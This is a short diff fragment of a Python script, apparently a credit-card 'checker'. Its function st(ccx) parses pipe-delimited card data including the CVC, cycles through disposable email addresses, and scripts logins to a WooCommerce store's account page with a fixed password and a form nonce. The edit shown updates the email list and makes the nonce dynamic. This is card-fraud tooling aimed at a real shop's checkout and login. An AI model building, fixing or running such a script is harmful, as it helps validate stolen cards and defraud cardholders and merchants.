@@ -15,7 +15,7 @@ def st(ccx):
     cvc = ccx.split("|")[3]
     
     email_list = [
-        "cofedo8911@ahanim.com",
+       
         "fexaw87614@ahanim.com",
         "bikota2853@ahanim.com",
        
@@ -82,7 +82,7 @@ def st(ccx):
     data = [
     ('username', random_email),
     ('password', 'xitioPass@1999'),
-    ('woocommerce-login-nonce', '6b5e80ae92'),
+    ('woocommerce-login-nonce', nonce),
     ('_wp_http_referer', '/my-account/'),
     ('login', 'Log in'),
     ('KZec-jAlayLqzT', 'NY0P]3WrpRDi'),
